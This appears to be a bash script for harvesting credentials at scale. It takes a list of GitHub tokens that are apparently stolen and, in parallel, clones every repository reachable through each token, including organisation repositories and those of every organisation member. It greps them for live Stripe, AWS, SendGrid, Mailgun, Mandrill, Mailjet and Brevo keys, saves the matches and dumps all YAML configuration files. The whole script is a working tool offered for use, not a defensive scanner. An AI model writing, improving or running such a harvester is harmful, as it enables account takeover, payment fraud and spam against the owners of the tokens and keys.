#!/bin/bash


INPUT_FILE="./githubvalid"
SUCCESS_ORGS="success_orgs"
SUCCESS_REPOS="success_repos"
FAILED_LOG="failed.log"
RESULTS_DIR="./scan_results"
KEYS_DIR="/tmp/keys"
YAML_DIR="/tmp/yaml"
MAX_JOBS=150
PER_PAGE=100
BATCH_SIZE=50


setup() {
  mkdir -p "$RESULTS_DIR" "$KEYS_DIR" "$YAML_DIR"
  chmod -R 777 "$KEYS_DIR" "$YAML_DIR"
  > "$SUCCESS_ORGS" > "$SUCCESS_REPOS" > "$FAILED_LOG"
  for key_file in 203Stripe 203AWS 203Sendgrid 203Mailgun 203Mandrill 203Mailjet 203Brevo; do
    > "$KEYS_DIR/$key_file.txt"
  done
  trap 'echo "Script interrupted"' EXIT
}


fetch_paginated() {
  local token="$1"
  local endpoint="$2"
  local page=1
  local items=()
  local max_retries=3
  local retry_delay=2

  if [ -z "$endpoint" ]; then
    echo "[ERROR] Empty endpoint passed to fetch_paginated" >> "$FAILED_LOG"
    return 1
  fi

  echo "[INFO] Fetching from endpoint: $endpoint" >&2

  while :; do
    local url="https://${token}@api.github.com${endpoint}?per_page=$PER_PAGE&page=$page"
    local retries=0
    local response

    while [ $retries -lt $max_retries ]; do
      response=$(curl -s --fail "$url" 2>/tmp/api_err) && break
      echo "[WARN] Retry $((retries+1)) for $endpoint page $page: $(< /tmp/api_err)" >> "$FAILED_LOG"
      ((retries++))
      sleep "$retry_delay"
    done

    if [ -z "$response" ]; then
      echo "[ERROR] Failed to fetch $endpoint page $page after $max_retries attempts" >> "$FAILED_LOG"
      break
    fi

    if echo "$response" | grep -qE 'Bad credentials|Not Found'; then
      echo "[ERROR] API returned error for $endpoint page $page: $(< /tmp/api_err)" >> "$FAILED_LOG"
      break
    fi

    local item_count
    item_count=$(echo "$response" | jq -r 'length')
    if [ "$item_count" -eq 0 ]; then
      echo "[INFO] No more items at $endpoint page $page" >&2
      break
    fi


    mapfile -t page_items < <(echo "$response" | jq -r '.[] | .full_name? // .login? // empty')

    if [ "${#page_items[@]}" -eq 0 ]; then
      echo "[WARN] No items parsed from page $page of $endpoint" >> "$FAILED_LOG"
    fi

    items+=("${page_items[@]}")
    echo "[DEBUG] Page $page: fetched ${#page_items[@]} items" >&2

    ((page++))
    sleep 0.5  
  done


  printf '%s\n' "${items[@]}"
}


process_repo() {
  local token="$1"
  local repo="$2"
  local repo_name="${repo//\//_}"
  local repo_path="/tmp/repos/$repo_name"
  local start_time=$(date +%s)

  if [ -z "$repo" ] || [ -z "$repo_name" ]; then
    echo "[ERROR] Invalid repo name for '$repo'" >> "$FAILED_LOG"
    return 1
  fi

  echo "[INFO] Processing repo: $repo" >&2

  mkdir -p "/tmp/repos"
  [ -d "$repo_path" ] && rm -rf "$repo_path"

  echo "[INFO] Cloning $repo..." >&2
  git clone --quiet "https://${token}@github.com/${repo}" "$repo_path" >/tmp/clone_err 2>&1
  if [ $? -ne 0 ] || [ ! -d "$repo_path" ]; then
    echo "[ERROR] $repo - Clone failed: $(< /tmp/clone_err)" >> "$FAILED_LOG"
    return 1
  fi
  echo "[INFO] Repo cloned: $repo_path" >&2

  local file_count
  file_count=$(find "$repo_path" -type f -not -path '*/.git/*' | wc -l)
  echo "[INFO] Files in $repo_name (excluding .git): $file_count" >&2
  if [ "$file_count" -eq 0 ]; then
    echo "[WARN] No files to scan in $repo_name (empty repo)" >> "$FAILED_LOG"
    rm -rf "$repo_path"
    return 0
  fi

  echo "$repo" >> "$SUCCESS_REPOS"
  echo "[INFO] Scraping secrets in $repo_name..." >&2

  declare -A patterns=(
    ['(pk|sk)_live_[a-zA-Z0-9]{10,99}']="$KEYS_DIR/203Stripe.txt"
    ['AKIA[A-Z0-9]{16}']="$KEYS_DIR/203AWS.txt"
    ['SG\.[\w_-]{16,32}\.[\w_-]{16,64}']="$KEYS_DIR/203Sendgrid.txt"
    ['((?i)(mailgun|mg)(.{0,20})?)?key-[0-9a-z]{32}']="$KEYS_DIR/203Mailgun.txt"
    ['smtp\.mandrillapp\.com']="$KEYS_DIR/203Mandrill.txt"
    ['in-v3\.mailjet\.com']="$KEYS_DIR/203Mailjet.txt"
    ['(xsmtpsib|xkeysib)-[a-f0-9]{64}-[A-Za-z0-9]+|smtp-relay\.(brevo|sendinblue)\.com']="$KEYS_DIR/203Brevo.txt"
  )

  grep_and_log() {
    local pattern="$1"
    local output_file="$2"

    grep -rPn --binary-files=text --exclude='*.html' --exclude-dir='.git' -C15 -E "$pattern" "$repo_path" 2>/tmp/grep_err | cut -c -500 >> "$output_file"
    
    if [ -s /tmp/grep_err ]; then
      echo "[ERROR] $repo - grep error: $(< /tmp/grep_err)" >> "$FAILED_LOG"
    fi
    if [ -s "$output_file" ]; then
      echo "[MATCH] $(basename "$output_file") - $(wc -l < "$output_file") entries" >&2
    fi
  }

  for pattern in "${!patterns[@]}"; do
    grep_and_log "$pattern" "${patterns[$pattern]}"
  done

  mkdir -p "$YAML_DIR"
  find "$repo_path" -type f -iname "*.yaml*" -exec cat {} \; >> "$YAML_DIR/${repo_name}_${token:0:7}_env.txt" 2>/dev/null
  echo "[INFO] YAML dump completed for $repo_name" >&2

  echo "[INFO] Cleaning up $repo_path..." >&2
  rm -rf "$repo_path"

  local end_time=$(date +%s)
  local duration=$((end_time - start_time))
  echo "[DONE] Finished $repo_name in ${duration}s" >&2
}


process_token() {
  local token="$1"
  echo "Processing token: ${token:0:7}..." >&2


  process_repo_async() {
    local token="$1"
    local repo="$2"
    process_repo "$token" "$repo"
  }


  process_all_repos() {
    local token="$1"
    local repos=("${@:2}")
    for repo in "${repos[@]}"; do
      [ -z "$repo" ] && continue
      process_repo_async "$token" "$repo" &
    done
    wait
  }


  username=$(curl -s "https://${token}@api.github.com/user" | jq -r '.login' 2>/tmp/user_err)
  if [ $? -ne 0 ] || [ "$username" = "null" ] || [ -z "$username" ]; then
    echo "Failed to get username for ${token:0:7}...: $(cat /tmp/user_err)" >> "$FAILED_LOG"
    return 1
  fi
  echo "Username: $username" >&2


  mapfile -t all_repos < <(fetch_paginated "$token" "/user/repos")
  echo "Found ${#all_repos[@]} accessible repos" >&2
  process_all_repos "$token" "${all_repos[@]}"


  mapfile -t orgs < <(fetch_paginated "$token" "/user/orgs")
  echo "Found ${#orgs[@]} orgs" >&2
  for org in "${orgs[@]}"; do
    [ -z "$org" ] && continue
    echo "$org" >> "$SUCCESS_ORGS"


    mapfile -t org_repos < <(fetch_paginated "$token" "/orgs/$org/repos")
    process_all_repos "$token" "${org_repos[@]}"


    mapfile -t members < <(fetch_paginated "$token" "/orgs/$org/members")
    echo "Found ${#members[@]} members in $org" >&2
    for member in "${members[@]}"; do
      [ -z "$member" ] && continue
      mapfile -t member_repos < <(fetch_paginated "$token" "/users/$member/repos")
      process_all_repos "$token" "${member_repos[@]}"
    done
  done
}

export -f process_repo fetch_paginated process_token
export INPUT_FILE SUCCESS_ORGS SUCCESS_REPOS FAILED_LOG RESULTS_DIR KEYS_DIR YAML_DIR MAX_JOBS PER_PAGE BATCH_SIZE

main() {
  setup

  if [ ! -f "$INPUT_FILE" ]; then
    echo "Error: Input file '$INPUT_FILE' not found." >&2
    exit 1
  fi

  total_tokens=$(wc -l < "$INPUT_FILE")
  echo "Found $total_tokens tokens in $INPUT_FILE" >&2

  mapfile -t all_tokens < <(cat "$INPUT_FILE" | sort -u)


  for ((i=0; i<${#all_tokens[@]}; i+=BATCH_SIZE)); do
    batch_end=$((i + BATCH_SIZE - 1))
    if [ $batch_end -ge ${#all_tokens[@]} ]; then
      batch_end=$((${#all_tokens[@]} - 1))
    fi
    echo "Processing batch $((i/BATCH_SIZE + 1)): tokens $i to $batch_end" >&2

    batch=("${all_tokens[@]:$i:$BATCH_SIZE}")
    echo "Batch size: ${#batch[@]} tokens" >&2


    printf '%s\n' "${batch[@]}" | parallel -j"$MAX_JOBS" --line-buffer process_token {}

    wait
    sync
    echo "Batch $((i/BATCH_SIZE + 1)) completed" >&2
  done

  echo "Process completed."
  echo "Organizations found: $(sort -u "$SUCCESS_ORGS" | wc -l)"
  echo "Repositories scanned: $(sort -u "$SUCCESS_REPOS" | wc -l)"
  echo "Failures: $(wc -l < "$FAILED_LOG")"
  echo "Results saved in: $RESULTS_DIR, $KEYS_DIR, $YAML_DIR"
}

main
